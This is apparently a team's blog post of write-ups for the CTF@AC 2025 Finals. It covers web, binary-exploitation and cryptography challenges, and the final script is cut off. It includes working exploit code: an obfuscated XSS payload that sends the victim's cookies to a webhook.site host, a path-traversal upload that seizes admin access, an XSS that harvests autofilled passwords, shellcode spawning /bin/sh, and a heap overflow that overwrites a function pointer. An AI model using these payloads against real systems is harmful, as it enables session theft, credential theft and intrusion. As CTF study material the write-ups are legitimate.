---
title: "CTF@AC 2025 Finals"
date: 2025-11-09T00:00:00+00:00
# weight: 1
# aliases: ["/first"]
tags: ["ctfatac", "ctf", "binary", "crypto", "web", "ctfatac2025"]
author: "Paolo"
# author: ["Me", "You"] # multiple authors
showToc: true
TocOpen: false
draft: false
hidemeta: false
comments: false
description: "All the writeups of the CTF@AC Finals ctf 2025 edition."
canonicalURL: "https://pascalctf.github.io/en/ctf/"
disableHLJS: false
disableShare: false
hideSummary: false
searchHidden: true
ShowReadingTime: true
ShowBreadCrumbs: true
ShowPostNavLinks: true
ShowWordCount: true
ShowRssButtonInSectionTermList: true
UseHugoToc: true
cover:
    image: "https://opengraph.githubassets.com/eccdc445364e4f9dcbece7bb7f178f0756be13a48717c78ec94bf78c35861b9a/PascalCTF/PascalCTF.github.io" # image path/url
    alt: "CTF@AC 2025 Finals" # alt text
    caption: "All the writeups of the CTF@AC Finals ctf 2025 edition." # display caption under cover
    relative: false # when using page bundles set this to true
    hidden: true # only hide on current single page
editPost:
    URL: "https://github.com/PascalCTF/PascalCTF.github.io/blob/main/content/en"
    Text: "Suggest Changes" # edit text
    appendFilePath: true # to append file path to Edit link
---

# CTF@AC 2025 Finals
![ctf at ac logo](/images/ctf@ac.png)

We (Paolo) partecipated this CTF in Timișoara from **Fri, 07 Nov. 2025, 16:00 CET** until **Sun, 09 Nov. 2025, 10:00 CET** arriving 2nd overall 🥳.

Even though it was our first experience as a CTF in an international contest we managed to have real fun while solving these challenges.

Team components that partecipated:

* **Marco Balducci**    ([`@Cryingfreeman74`](https://github.com/Mark-74))
* **Alan Davide Bovo**  ([`@Hecker404`](https://github.com/AlBovo))
* **Enea Maroncelli**   ([`@Zazaman`](https://github.com/eneamaroncelli27))

![Team photo](/images/teampaoloac.jpg)

## Web 🌐

### Silicon Dioxide

#### Analysis

This challenge provided the source code for a Node.js web application designed for writing and sharing “sandboxed” JavaScript code to edit a canvas. It had both a frontend and a backend handling the JavaScript execution.

##### Frontend

The frontend implemented a homemade “sandboxed” environment to run JavaScript code as follows:

```js
/**
 * Super Duper Sandbox
 */
function canvasSandbox(code) {
    try {
        const sandboxFunc = new Function(
            "canvas",
            `
            const window = undefined;
            const document = undefined;
            const alert = undefined;
            const console = undefined;
            const eval = undefined;
            const Function = undefined;
            const setTimeout = undefined;
            const setInterval = undefined;
            const fetch = undefined;
            const XMLHttpRequest = undefined;
            const WebSocket = undefined;
            const localStorage = undefined;
            const sessionStorage = undefined;
            const location = undefined;
            const history = undefined;
            const navigator = undefined;
            const parent = undefined;
            const top = undefined;
            const self = undefined;
            const globalThis = undefined;
            canvas.constructor = null;
            canvas.__proto__.constructor = null;
            canvas.__proto__.__proto__.constructor = null;
            canvas.__proto__.__proto__.__proto__.constructor = null;
            canvas.__proto__.__proto__.__proto__.__proto__.constructor = null;
            canvas.__proto__.__proto__.__proto__.__proto__.__proto__.constructor = null;
            canvas.__proto__.__proto__.__proto__.__proto__.__proto__.__proto__.constructor = null;
            
            ${code}
        `
        );

        sandboxFunc.call(null, canvas);
    } catch (err) {
        alert("Sorry, your code did not run.");
    }
}
```

It also provided a function that automatically executed any JavaScript code passed through the `/?code=` query parameter inside this sandboxed environment.

##### Backend

The backend was responsible for sharing the code and included an additional layer of checks:

```js
const allowed_keywords = [
    "const",
    "ctx",
    "canvas",
    "getContext",
    "console",
    "let",
    "vx",
    "vy",
    "radius",
    "function",
    "update",
    "clearRect",
    "width",
    "height",
    "if",
    "beginPath",
    "arc",
    "Math",
    "PI",
    "fillStyle",
    "orange",
    "fill",
    "requestAnimationFrame"
];

function checkCode(code) {
    const matches = code.match(/[A-Za-z]{2,}/g) || [];

    const disallowed = matches.filter((k) => !allowed_keywords.includes(k));

    return disallowed.length === 0;
}
```

The `/share` endpoint worked as follows:

* It checked the code for disallowed keywords.
* It made a Chromium bot run it using the `/?code=` endpoint.

However, the main vulnerability was in the flag cookie — it was stored with `httpOnly: false`, meaning a simple XSS could easily steal it.

```js
context.addCookies([
    {
        name: "flag",
        domain: "localhost",
        path: "/",
        value: FLAG,
        sameSite: "Lax",
        secure: false,
        httpOnly: false
    }
]);
```

#### Solution

After analyzing the entire challenge, finding a working solution was straightforward. The backend’s keyword check could be bypassed using UTF-8 encoding (bypassing the `[A-Za-z]{2,}` regex check). Then, the frontend could be exploited using the keyword `this`.

The frontend only removed *direct* references to most JavaScript functions but didn’t properly sanitize access through the actual `window` or `document` context.

Once we realized this, we wrote a fully working exploit that exfiltrated the admin’s cookie using a `fetch` request to our webhook.

#### Exploit

```js
const ctx = canvas.getContext('2d');
const p = ctx['\u005f\u005f\u0070\u0072\u006f\u0074\u006f\u005f\u005f'];
const c = p['\u0063\u006f\u006e\u0073\u0074\u0072\u0075\u0063\u0074\u006f\u0072'];
const f = c['\u0063\u006f\u006e\u0073\u0074\u0072\u0075\u0063\u0074\u006f\u0072'];
const g = f('\u0072\u0065\u0074\u0075\u0072\u006e\u0020\u0074\u0068\u0069\u0073')();
const d = g['\u0064\u006f\u0063\u0075\u006d\u0065\u006e\u0074'];
const s = d['\u0063\u006f\u006f\u006b\u0069\u0065'];
const e = g['\u0065\u006e\u0063\u006f\u0064\u0065\u0055\u0052\u0049\u0043\u006f\u006d\u0070\u006f\u006e\u0065\u006e\u0074'];
const h = g['\u0066\u0065\u0074\u0063\u0068'];
const u = e(s);
h('\u0068\u0074\u0074\u0070\u0073\u003a\u002f\u002f\u0077\u0065\u0062\u0068\u006f\u006f\u006b\u002e\u0073\u0069\u0074\u0065\u002f\u0035\u0063\u0035\u0038\u0037\u0066\u0037\u0061\u002d\u0031\u0063\u0030\u0030\u002d\u0034\u0035\u0038\u0032\u002d\u0061\u0035\u0062\u0033\u002d\u0031\u0061\u0030\u0038\u0064\u0065\u0032\u0031\u0032\u0033\u0061\u0062\u003f\u0064\u003d' + u);
```

Once executed, the flag appeared in the webhook logs as:

`d=flag=CTF{c0d2d75449e3167001cbb38b891a78c8168c165d2cbd48f8f7b3123759963f66}`

### Retro Forum

#### Analysis

Retro Forum was a post/chat web platform where users could share their thoughts and administrators could moderate them.

The source code revealed how the SQLite database was structured and where it was stored, along with the main vulnerability in this route:

```python
@app.route('/edit_profile', methods=['GET', 'POST'])
def edit_profile():
    if 'user_id' not in session:
        return redirect(url_for('login'))
    conn = get_db()
    c = conn.cursor()
    if request.method == 'POST':
        new_bio = request.form['bio']
        filename = None
        if 'profile_pic' in request.files:
            file = request.files['profile_pic']
            if file:
                filename = file.filename
                print(filename)
                file.save(os.path.join(app.config['UPLOAD_FOLDER'], filename))
                c.execute("UPDATE users SET profile_pic=? WHERE id=?", (filename, session['user_id']))
        c.execute("UPDATE users SET bio=? WHERE id=?", (new_bio, session['user_id']))
        conn.commit()
        conn.close()
        return redirect(url_for('profile', id=session['user_id']))
    c.execute("SELECT bio, profile_pic FROM users WHERE id=?", (session['user_id'],))
    bio, pic = c.fetchone()
    conn.close()
    return render_template('edit_profile.html', bio=bio, pic=pic)
```

Here, the image uploaded by the user was saved **without any sanitization or validation**, leaving the platform vulnerable to a **path traversal** attack, allowing the user to overwrite any file with their uploaded image.

Before explaining the solution, it’s important to note the existence of the `debug_file` endpoint:

```python
@app.route('/debug/<filename>')
def debug_file(filename):
    if not session.get('is_admin'):
        return redirect(url_for('login'))
    try:
        file_path = os.path.join(os.getcwd(), filename)
        with open(file_path, 'r') as f:
            content = f.read()
        return content, 200, {'Content-Type': 'text/plain'}
    except Exception as e:
        return f"Error: {str(e)}", 404
```

This endpoint later gave **arbitrary read access** to the full filesystem, allowing us to retrieve the actual flag.

#### Solution

Once the **path traversal** vulnerability was confirmed, the next step was to **overwrite the `retro.db`** file by uploading a malicious file named `../../retro.db` through the profile picture upload form.

After successfully overwriting the database, I gained **admin privileges**, which allowed me to use another path traversal vulnerability in the *debug file* endpoint to read arbitrary files.

From there, I downloaded `flag.txt`

```
gAAAAABpDfJWpJyLk4xz6hJCspj6XEpp0dCKgZUegC18TYQHfABujfRSTCa0zEei6qnDP6k8I-2V0by1aeJSEhKhhWI5EWppnQ==
```

and `populate.py`, which contained the logic for initializing the database.

Inside `populate.py`, I found default user data and posts, including a user named **Josh**, who frequently mentioned his password in his social posts and chats.

By analyzing these, I inferred that Josh’s password was used as the key to encrypt the flag with **Fernet**. Using this clue, I brute-forced all possible combinations of his password fragments until the flag decrypted successfully.

#### Script

Several scripts were used to solve this challenge, but the two most significant are the **exploit to gain admin privileges** and the **password brute-forcing script**.

##### Admin Privilege Exploit

```python
#!/usr/bin/env python3
import requests
import sys, os
import sqlite3, tempfile
from werkzeug.security import generate_password_hash

URL = sys.argv[1]
assert requests.get(f"{URL}/").status_code == 200

def init_db(filename="retro.db"):
    conn = sqlite3.connect(filename)
    c = conn.cursor()
    c.execute('''CREATE TABLE users (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        username TEXT UNIQUE,
        password TEXT,
        bio TEXT,
        is_admin INTEGER DEFAULT 0,
        profile_pic TEXT DEFAULT 'default.png'
    )''')
    c.execute('''CREATE TABLE posts (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id INTEGER,
        title TEXT,
        content TEXT,
        FOREIGN KEY (user_id) REFERENCES users(id)
    )''')
    c.execute('''CREATE TABLE comments (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        post_id INTEGER,
        user_id INTEGER,
        content TEXT,
        FOREIGN KEY (post_id) REFERENCES posts(id),
        FOREIGN KEY (user_id) REFERENCES users(id)
    )''')
    c.execute('''CREATE TABLE chats (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user1_id INTEGER,
        user2_id INTEGER,
        FOREIGN KEY (user1_id) REFERENCES users(id),
        FOREIGN KEY (user2_id) REFERENCES users(id)
    )''')
    c.execute('''CREATE TABLE messages (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        chat_id INTEGER,
        sender_id INTEGER,
        content TEXT,
        timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
        FOREIGN KEY (chat_id) REFERENCES chats(id),
        FOREIGN KEY (sender_id) REFERENCES users(id)
    )''')
    c.execute("INSERT INTO users (username, password, bio, is_admin) VALUES (?, ?, ?, 1)",
              ("admin", generate_password_hash("admin123"), "Retro overlord"))
    conn.commit()
    conn.close()

s = requests.Session()
s.post(f"{URL}/register", data={
    "username": (username := os.urandom(20).hex()),
    "password": (password := os.urandom(20).hex()),
    "bio": "hello",
})
s.post(f"{URL}/login", data={
    "username": username,
    "password": password,
})

with tempfile.NamedTemporaryFile("w+b") as tf:
    print(tf.name)
    init_db(tf.name)

    s.post(f"{URL}/edit_profile", data={
        "bio": "palle",   
    }, files={
        "profile_pic": ("../../retro.db", tf, "image/jpeg"),
    })

print("[*] Uploaded malicious profile picture")
s.get(f"{URL}/logout")
r = s.post(f"{URL}/login", data={
    "username": "admin",
    "password": "admin123",
})

print(s.cookies.get_dict())
```

##### Password Brute-Force Script

> N.B.: The lists `d` and `n` contained words and dates found in Josh’s chats, which hinted at the password structure.

```python
import base64, itertools
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

d = ['20.05.2023', '14.03.2001']
n = ['pixel', 'wigglepuff']
i = n + d
l = list(itertools.permutations(i))

for perm in l:
    password = ".".join(perm).encode()
    salt = b"whatever"

    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=390000,
    )
    key = base64.urlsafe_b64encode(kdf.derive(password))
    f = Fernet(key)

    with open("flag.txt", "rb") as fh:
        token = fh.read()

    try:
        plaintext = f.decrypt(token)
        print(f"Password found: {password.decode()}")
        print(plaintext.decode())
        break
    except:
        continue
```

This combination of exploits and analysis led to the successful decryption of the flag and completion of the challenge.

### Not wordle

#### Analysis

This challenge was a Node.js Wordle-like platform where you could guess some random words (all of them were exactly 5 characters).

However, the challenge provided a switch for "random"/"daily" words. The second one, especially, used a special code `wotd`. After analyzing the backend source for a while I found this little snippet that implemented the logic for word generation.

```js
function getSecret(mode, cookies) {
    const m = (mode || cookies.mode || 'random').toLowerCase();
    if (m === 'wotd') {
        const flag = (process.env.FLAG || 'REAL_FLAG_ON_REMOTE').toLowerCase();
        return { mode: 'wotd', secret: flag };
    }
    let secret = cookies.randomSecret;
    if (!secret || !/^[a-z]{5}$/.test(secret)) {
        secret = pickRandomWord();
    }
    return { mode: 'random', secret };
}
```

Here it's clear that the flag was the daily word on the platform, and basically all we had to do was find it.

#### Solution

Since the challenge didn't store any counter for how many times a user tried to guess, it was trivial to find the flag by brute force.

Nevertheless, the challenge didn't even check the length of the guess, so it was also possible to brute-force the word character-by-character using the alphabet `0123456789abcdefCTF{}`.

#### Script

```python
#!/usr/bin/env python3
import string, requests

URL = "http://a733fa9b.ctf.ac.upt.ro"
LENGTH = 69
CHARSET = 'CTF{}' + string.hexdigits.lower()

s = requests.Session()
s.post(URL + "/api/start?mode=wotd")

flag = ''
for i in range(LENGTH):
    for c in CHARSET:
        r = s.post(URL + "/api/check", json={"guess": flag + c}).json()
        if r['feedback'][i]["status"] == "correct":
            flag += c
            print(flag)
            break

print("FLAG:", flag)
```

### lolchat2

#### Analysis

This challenge was a sequel to the original `lolchat`, which we didn't solve during the qualifiers round.
It provided a room-based chat developed using WebSockets in a **black-boxed environment**, we didn't have access to the backend source code, so several assumptions had to be made.

As in the original challenge, the first three rooms didn't respond to our messages. However, in the `party` and `game` chat rooms, there were some users exchanging random messages.

The most interesting one was the `game` room, where the user `tom` repeatedly sent the same messages, asking for help finding his **password** (the flag). The most notable messages included:

* "i think i had a password saved in my browser"
* "it would usually fill it out for me"

![challenge game room's screenshot](/images/lolchat2.png)

#### Solution

After some quick observations, it became clear that the platform was heavily vulnerable to **XSS (Cross-Site Scripting)**, the only actual validation was **client-side**, applied only when *sending* messages, not when *receiving* them.

Initially, we tried redirecting the bot to our webhook, but this didn't work, it was likely restricted to its localhost network. We then hypothesized that the best approach would be to make the bot **send a message** to the chat containing sensitive data using our injected script, and this time, it **worked**.

Ultimately, we realized we could make the bot **autofill** a password input field (using its saved credentials) and **send** the value directly to the chat for everyone to see.

#### Script

Below is the HTML code we used to solve the challenge. It relied on the assumption that the bot's browser would automatically fill in the password input, triggering the `oninput` event, which then sent the message to the `game` chat room.

```html
<form>
  <input type="password" name="password" autocomplete oninput="window.socket.emit('sendMessage', { room: 'game', message: document.getElementsByName('password')[0].value });">
</form>
```

## Binary exploitation 🏴‍☠️

### baby-ikea

#### Analysis

The challenge provided the possibility to connect using netcat to the server and send some data.
Reading the errors that the service was responding with, it was clear that you were only allowed to send base64-encoded data.

I tried some random instructions in assembly and I found out that it was a 32-bit architecture and it would run arbitrary asm code.

#### Solution

The solution involved writing a complete asm script in the correct structure and making it do whatever you wanted. I decided to make it spawn a shell, then base64-encode the script and send it to the server.

#### Script

```py
from pwn import *
import base64
p = remote('?', ?)

## Calls execve('/bin/sh') and spawns a shell
shellcode = """
section .data
    path    db '/bin/sh', 0         
    envp    dd 0                    
section .text
    global _start

_start:
    mov eax, 11          ; syscall number for execve
    mov ebx, path        ; filename pointer
    mov edx, envp        ; envp pointer

    int 0x80             ; call kernel

    mov eax, 1
    xor ebx, ebx
    int 0x80
"""

p.sendlineafter('> ', base64.b64encode(shellcode.encode()).decode())
p.interactive()
```

### Tetrastack

#### Analysis

Tetrastack is a service that lets us play Tetris.

By analyzing the different menu entries, we can see there is an option to save our name, but only after the game is over.
The decompiled function `set_name` is the following: 
```c
void __cdecl set_name(Player *p)
{
  size_t v1; // rax
  signed __int64 got; // [rsp+20h] [rbp-10h]
  signed __int64 n; // [rsp+28h] [rbp-8h]

  if ( board->game_over )
  {
    puts("\nEnter display name length:");
    n = read_long();
    if ( n > 0 )
    {
      puts("Enter display name bytes:");
      got = read_n((unsigned __int8 *)p->name, n);
    ...
```

As we can see, there is a vulnerability in how the name length is read. The length has a lower bound check (n > 0) but no upper bound (n < 64), so we can send something like 255 to perform a buffer overflow.

To actually get something out of the overflow, we need to understand where `player->name` is in memory and what is positioned after it.

Our answer lies in the `main` function:
```c
  player = (Player *)calloc(1u, 0x10u);
  player->name_cap = 64;
  v4 = player;
  v4->name = (char *)malloc(player->name_cap);
  callbacks = (Callbacks *)malloc(0x10u);
  callbacks->on_gameover = real_gameover;
  callbacks->on_lineclear = 0;
```

As we can see, the name is on the heap, and immediately after it there is a `Callbacks` struct that contains two function pointers: `on_gameover` and `on_lineclear`.

#### Solution
With the help of GDB, I found the precise heap offsets and was able to overwrite the `on_gameover` function pointer with the address of `win`.

#### Script
```python
#!/usr/bin/env python3

from pwn import *

elf = ELF("./tetrastack_patched")

context.binary = elf
context.terminal = ('kgx', '-e')

def conn():
    if args.REMOTE:
        r = remote("8a0e1141.ctf.ac.upt.ro", 9449)
    elif args.GDB:
        r = gdb.debug(elf.path, '''
                                b main
                                b set_name
                                continue
                      ''')
    else:
        r = process(elf.path)

    return r

def wait_menu_or_prompt(io, prompt=b"8) Quit"):
    data = b""
    while True:
        chunk = io.recvuntil(b"\n", timeout=0.5)
        if not chunk:
            continue
        data += chunk
        if b"Enter display name length" in data:
            return data, True
        if prompt in data:
            return data, False

def reach_game_over(io, max_steps=2000):
    data, got_prompt = wait_menu_or_prompt(io)
    if got_prompt:
        return
    for _ in range(max_steps):
        io.sendline(b"1")
        data, got_prompt = wait_menu_or_prompt(io)
        if got_prompt:
            log.info("Reached name prompt")
            return
    raise RuntimeError("Failed to trigger game over")

def main():
    r = conn()

    reach_game_over(r)
    r.sendline(b'88')
    r.sendlineafter(b'bytes:', b'a' * 80 + p64(elf.sym.win))
    r.sendline(b'8')

    x = r.recvall(timeout=1).decode()
    r.close()
    
    print(x)
    # r.interactive()

if __name__ == "__main__":
    main()
```

### mini-e8

#### Analysis

`mini-e8` is a small REPL-based “engine” binary. The Engine constructor reads `flag.txt`, computes a 64‑byte rolling XOR checksum, XORs that with `0x7E3A829F`, and stores a 16‑byte `flag_header` followed by the flag bytes in an arena pointed to by `(QWORD*)Engine + 5`. A separate JS‑style byte buffer shares this arena `in front of` the flag_header.

##### Header Layout (little-endian dwords)
```
flag_header[0] = 0x00000001          # must be forced to 0 for getflag
flag_header[1] = checksum(flag)^0x7E3A829F
flag_header[2] = 0x8BADF00D          # magic constant checked by getflag
flag_header[3] = 0x00000000          # becomes our “unlock” field; needs 42 before second opt
```
Flag bytes start at flag_header + 0x10.

##### Critical Functions
- Engine::Engine: Writes flag_header + flag into arena;
- compute_checksum(flag): rolling XOR of first 64 bytes then XOR with `0x7E3A829F`.
- cmd_optimize_function (`opt`): First call enables “fast mode” (writes check capacity). Second call: if `flag_header[3] == 42`, sets an enable byte at `Engine+0x80` to 1.
- cmd_getflag (`getflag`) requires:
  1. flag_header[2] == 0x8BADF00D
  2. recomputed_checksum ^ 0x7E3A829F == flag_header[1]
  3. flag_header[0] == 0
  4. enable byte at `Engine+0x80` == 1

##### Vulnerability
In fast mode, `write <idx> <val>` validates `idx < capacity` instead of `idx < length`. Capacity > length, so indices beyond the logical buffer body (>= current length) can include the adjacent flag_header. This gives controlled single‑byte writes to flag_header fields.

```c
if ( *((_BYTE *)this + 0x20) && a2 < *((_QWORD *)this + 5) || a2 < *((_QWORD *)this + 2) )
  {
    result = *(_QWORD *)this;
    *(_BYTE *)(*((_QWORD *)this + 1) + **(_QWORD **)this + a2) = a3;
  }
```

##### Offsets Mapped to Header Bytes
After first `opt`, since flag_header is located after the buffer in memory, the following indices (in the REPL) address the flag_header:
```
64..67  -> flag_header[0]
68..71  -> flag_header[1]
72..75  -> flag_header[2]
76..79  -> flag_header[3]
```
We only need to change flag_header[0] (set all four bytes to 0) and flag_header[3] (set least significant byte to 42 and clear the rest) before invoking the second `opt`.

#### Solution

+ Run `opt` once to enter fast (capacity-based) write mode.
+ Zero `flag_header[0]` by writing 0 to offsets 64–67.
+ Set unlock value: write bytes 76–79 as `42, 0, 0, 0` so `flag_header[3] == 42`.
+ Run `opt` again; second optimize sees header[3] == 42 and flips the enable byte.
+ Call `getflag`; all conditions now satisfy and it prints the flag from header+0x10.

```
opt
write 64 0
write 65 0
write 66 0
write 67 0
write 76 42
write 77 0
write 78 0
write 79 0
opt
getflag
```

#### Script

```python
steps = [
    b"opt",                # enter fast path
    b"write 64 0",         # flag_header[0] byte 0
    b"write 65 0",         # flag_header[0] byte 1
    b"write 66 0",         # flag_header[0] byte 2
    b"write 67 0",         # flag_header[0] byte 3
    b"write 76 42",        # flag_header[3] byte 0 -> 42
    b"write 77 0",         # remaining bytes zeroed
    b"write 78 0",
    b"write 79 0",
    b"opt",                # second optimize flips enable if header[3]==42
    b"getflag",            # prints flag if all checks pass
]
```

## Cryptography 🔑

### Sparse Hills

#### Analysis

We looked at the service as a simple linear cipher over Z_257, where the server computes $c = K m \bmod 257$. The same 257×257 key matrix is reused, inputs are zero‑padded to a full block, and outputs are printed as three‑hex‑digit numbers. Since the oracle lets us encrypt anything and the mapping is linear, we can reveal the columns of $K$ by encrypting basis vectors. That means we can recover the key and, from there, the flag.

#### Solution

I first grab the encrypted flag so we have its ciphertext. Then we encrypt each canonical basis vector,one position set to 1, the rest 0. Each such query returns a column of $K$. When we stack those results, we reconstruct the whole matrix. I invert this matrix modulo 257 using Gauss‑Jordan elimination (Fermat inverses make division easy), multiply the inverse by the flag ciphertext to get the plaintext vector, turn 256 into 0 when converting to bytes, strip the zero padding, and decode as UTF‑8. We need exactly 257 encryptions for recovery, and the inversion is fast at this size.

#### Script

```python
import socket
import sys
import re
from typing import List

P = 257  # Prime modulus
N = 257  # Block length == dimension

def recv_until(sock: socket.socket, marker: bytes) -> bytes:
    """Read from socket until `marker` appears."""
    buf = bytearray()
    while marker not in buf:
        chunk = sock.recv(4096)
        if not chunk:
            break
        buf += chunk
    return bytes(buf)

def recv_all(sock: socket.socket) -> bytes:
    """Read until the socket is closed and return all bytes."""
    buf = bytearray()
    while True:
        chunk = sock.recv(65536)
        if not chunk:
            break
        buf += chunk
    return bytes(buf)

HEX3_RE = re.compile(r"^(?:[0-9a-f]{3}\s+){256}[0-9a-f]{3}$", re.IGNORECASE)

def parse_hex_vector(blob: bytes) -> List[int]:
    """Extract the final 257-entry hex vector from a server response."""
    text = blob.decode(errors="ignore")
    for line in reversed(text.strip().splitlines()):
        line = line.strip()
        if HEX3_RE.fullmatch(line):
            return [int(tok, 16) for tok in line.split()]
    raise ValueError("Could not find a valid ciphertext line in server output.")


# Oracle wrappers

def get_encrypted_flag(host: str, port: int) -> List[int]:
    """Request option 1 from the server and parse the returned ciphertext."""
    s = socket.socket()
    s.connect((host, port))
    recv_until(s, b"> ")
    s.sendall(b"1\n")
    data = recv_all(s)
    s.close()
    return parse_hex_vector(data)

def encrypt(host: str, port: int, block: bytes) -> List[int]:
    """Request option 2 and send a 257-byte block, returning the ciphertext."""
    assert len(block) == N, "block must be exactly N=257 bytes"
    s = socket.socket()
    s.connect((host, port))
    recv_until(s, b"> ")
    s.sendall(b"2\n")
    recv_until(s, b"> ")
    s.sendall(block)
    data = recv_all(s)
    s.close()
    return parse_hex_vector(data)


# Modular algebra

def mat_inv_mod_p(A: List[List[int]], p: int) -> List[List[int]]:
    """Compute the inverse of A modulo prime p using Gauss-Jordan."""
    n = len(A)
    M = [[A[i][j] % p for j in range(n)] for i in range(n)]
    I = [[1 if i == j else 0 for j in range(n)] for i in range(n)]
    
    for col in range(n):
        # Find a pivot row with nonzero in column 'col'
        pivot = col
        while pivot < n and M[pivot][col] == 0:
            pivot += 1
        if pivot == n:
            raise ValueError("Matrix not invertible (no pivot).")

        # Swap to current row if needed
        if pivot != col:
            M[col], M[pivot] = M[pivot], M[col]
            I[col], I[pivot] = I[pivot], I[col]

        # Normalize pivot row
        inv_piv = pow(M[col][col], p - 2, p)  # Fermat inverse (p is prime)
        for j in range(n):
            M[col][j] = (M[col][j] * inv_piv) % p
            I[col][j] = (I[col][j] * inv_piv) % p

        # Eliminate this column from all other rows
        for r in range(n):
            if r == col:
                continue
            factor = M[r][col]
            if factor:
                for j in range(n):
                    M[r][j] = (M[r][j] - factor * M[col][j]) % p
                    I[r][j] = (I[r][j] - factor * I[col][j]) % p
    return I

def mat_vec_mod_p(M: List[List[int]], v: List[int], p: int) -> List[int]:
    n = len(M)
    out = [0] * n
    for i in range(n):
        s = 0
        row = M[i]
        for j in range(n):
            s += row[j] * v[j]
        out[i] = s % p
    return out


def recover_matrix_K(host: str, port: int) -> List[List[int]]:
    K_cols = []
    for i in range(N):
        block = bytearray(N)
        block[i] = 1  # e_i (mod 257)
        y = encrypt(host, port, bytes(block))
        if len(y) != N:
            raise RuntimeError("oracle returned wrong vector length")
        K_cols.append(y)
        # Optional progress indicator
        if (i + 1) % 16 == 0 or i == N - 1:
            print(f"[+] collected {i + 1}/{N} columns of K")
    # Convert "list of columns" -> 2D matrix (row-major)
    K = [[K_cols[j][i] for j in range(N)] for i in range(N)]
    return K

def strip_zero_padding(mbytes: bytes) -> bytes:
    if 0 in mbytes:
        return mbytes[:mbytes.index(0)]
    return mbytes

def main():
    host = sys.argv[1] if len(sys.argv) >= 2 else "127.0.0.1"
    port = int(sys.argv[2]) if len(sys.argv) >= 3 else 12346

    print(f"[*] Target: {host}:{port}")
    print("[*] Fetching encrypted flag...")
    c_flag = get_encrypted_flag(host, port)
    print("[+] Got encrypted flag (257 integers).")

    print("[*] Recovering encryption matrix K via 257 chosen-plaintext queries...")
    K = recover_matrix_K(host, port)
    print("[+] Recovered K.")

    print("[*] Inverting K modulo 257...")
    K_inv = mat_inv_mod_p(K, P)
    print("[+] Inverted K.")

    print("[*] Decrypting flag...")
    m_vec = mat_vec_mod_p(K_inv, c_flag, P)

    # Sanity: we expect every coordinate to be in 0..255 (not 256)
    if any(x == 256 for x in m_vec):
        print("[!] Warning: found value 256 in plaintext vector; replacing with 0 for bytes().")
    m_bytes = bytes((0 if x == 256 else x) for x in m_vec)
    m_bytes = strip_zero_padding(m_bytes)

    try:
        decoded = m_bytes.decode("utf-8", errors="replace")
    except Exception:
        decoded = repr(m_bytes)

    print(decoded)

if __name__ == "__main__":
    main()
```

### Black prince

#### Analysis

- Recon showed a very simple web app with two endpoints:
  - `/encode`: takes an input constrained to uppercase letters A–Z, digits 0–9, braces `{}` and underscore `_`, and renders a sequence of four-letter tokens.
  - `/flag`: renders a long "sentence" made entirely of four-letter words (tokens) instead of a human-readable flag.

`/encode` is a randomized encoder that maps each input character to one of several possible four-letter tokens. The `/flag` page is the encoded flag using those tokens.

A single pass over the character set only reveals a subset of tokens. To decode `/flag`, we must harvest all token variants that appear on `/flag` by repeatedly querying `/encode` with repeated characters and collecting any hits that match tokens seen on `/flag`.

The allowed alphabet is 39 symbols (26 letters + 10 digits + `{`, `}`, `_`).


#### Solution

So, the strategy is to fetch the ordered token sequence from `/flag`, then repeatedly send `ch * N` for each allowed character to `/encode`, recording any returned token that also appears on `/flag`. When every `/flag` token has a mapped character, reconstruct the flag by substitution in order. In practice, repeating a character coaxes out multiple token variants.

#### Script

```python
import time
import random
import string
from typing import Dict, List

import requests
import bs4

BASE_URL = 'http://168908dd.ctf.ac.upt.ro'
ROUNDS = 60
REPEATS = 10
SLEEP = 0
CHARSET = string.ascii_uppercase + string.digits + '{}_'
FIELD_NAME = 'text'

session = requests.Session()
session.headers.update({'User-Agent': 'simple-encoder-solver/1.0'})


def parse_tokens(html: str) -> List[str]:
    soup = bs4.BeautifulSoup(html, 'html.parser')
    div = soup.find('div', class_='encoded')
    if not div:
        return []
    return [el.get_text(strip=True) for el in div.find_all() if el.get_text(strip=True)]


def get_flag_tokens() -> List[str]:
    r = session.get(BASE_URL + '/flag', timeout=15)
    r.raise_for_status()
    return parse_tokens(r.text)


def encode(text: str) -> List[str]:
    r = session.post(BASE_URL + '/encode', data={FIELD_NAME: text}, timeout=15)
    r.raise_for_status()
    return parse_tokens(r.text)


def solve() -> str:
    flag_tokens = get_flag_tokens()
    if not flag_tokens:
        raise RuntimeError('No tokens returned from /flag')
    needed = set(flag_tokens)
    mapping: Dict[str, str] = {}

    for _ in range(ROUNDS):
        chars = list(CHARSET)
        random.shuffle(chars)
        for ch in chars:
            try:
                tokens = encode(ch * REPEATS)
            except Exception:
                continue
            for t in tokens:
                if t in needed and t not in mapping:
                    mapping[t] = ch
            if SLEEP:
                time.sleep(SLEEP)
        if len(mapping) == len(needed):
            break

    decoded = ''.join(mapping.get(t, '?') for t in flag_tokens)
    print(f"Mapped {len(mapping)}/{len(needed)} tokens")
    return decoded


if __name__ == '__main__':
    print(solve())

```

### Rule of X

#### Analysis

The challenge is a service where we can do two things: 
+ Encrypt a story that contains the flag
+ Encrypt a plaintext of our choice
```
Welcome to The Dream of Poliphilus!
1. Get a story and a flag
2. Encrypt plaintext
>
```

By encrypting some plaintexts, I found that a 4-byte block always maps to another 4-byte block (ECB-like).
```
> aaaa1
Ciphertext:
46d08e66 948d0fbf

> aaaa
Ciphertext:
46d08e66 31a3a187

> 1
Ciphertext:
948d0fbf
```

#### Solution

Given that a 4-byte block always maps to another 4-byte block, to decrypt the whole text we would need to send every possible combination of 4 characters to be encrypted... or would we?

In fact, we don't care about the entire text, we just need the flag. Knowing the flag format (CTF{hexvalues}), we can narrow down the alphabet to encrypt.

So we arrive at this solution:
```python
from itertools import product
from pwn import *
from tqdm import trange
context.log_level = 'critical'

alphabet = 'CTF{}' + '0123456789abcdef'

combs = product(alphabet, repeat=4)

payload = ''.join([''.join(c) for c in combs])

output = ''
blocks = [payload[i:i+4] for i in range(0, len(payload), 4)]
for i in trange(0, len(blocks), 100):
    r = remote('28267ab8.ctf.ac.upt.ro', 9323)
    r.sendlineafter(b'> ', b'2')
